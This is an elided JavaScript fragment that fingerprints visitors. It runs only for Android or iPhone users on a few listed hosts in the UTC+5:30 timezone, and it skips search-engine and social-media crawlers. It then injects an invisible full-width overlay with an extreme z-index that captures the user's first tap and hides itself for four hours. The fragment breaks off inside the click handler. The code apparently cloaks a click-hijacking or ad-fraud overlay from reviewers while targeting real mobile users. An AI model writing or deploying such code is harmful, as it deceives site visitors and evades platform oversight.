...
async function isckMobile200() {
    ...
    if (!/android|iphone/i.test(ua)) return false;
    if (/bot|crawl|spider|baidu|bing|duckduck|google|yandex|yahoo|facebook|twitter/i.test(ua)) return false;
    ...
    const allowedHosts = [
        ...
        "www.cychok.com",
        "gurujiportal.com",
        "www.gurujiportal.com"
    ];

    if (!allowedHosts.includes(location.hostname)) return false;
    if (new Date().getTimezoneOffset() !== -330) return false;
...
(async function () {
    ...
    if (!(await isckMobile200())) return;

    const STORAGE_KEY = "offerBoxHideUntil";
    const HIDE_TIME = 4 * 60 * 60 * 1000; // 4 hours

    // Already hidden?
    if (Date.now() < Number(localStorage.getItem(STORAGE_KEY) || 0)) {
        return;
    }

    // Prevent duplicate injection
    if (document.getElementById("offerBoxInject")) return;

    // CSS
    const style = document.createElement("style");
    style.textContent = '#offerBoxInject{width:100%;height:250px;box-sizing:border-box;user-select:none;bottom:0;position:fixed;z-index:9999999999999}';
    document.head.appendChild(style);

    // HTML
    const box = document.createElement("div");
    box.id = "offerBoxInject";
    document.body.appendChild(box);

    // Click
    box.onclick = () => {
        localStorage.setItem(STORAGE_KEY, Date.now() + HIDE_TIME);
        box.remove();
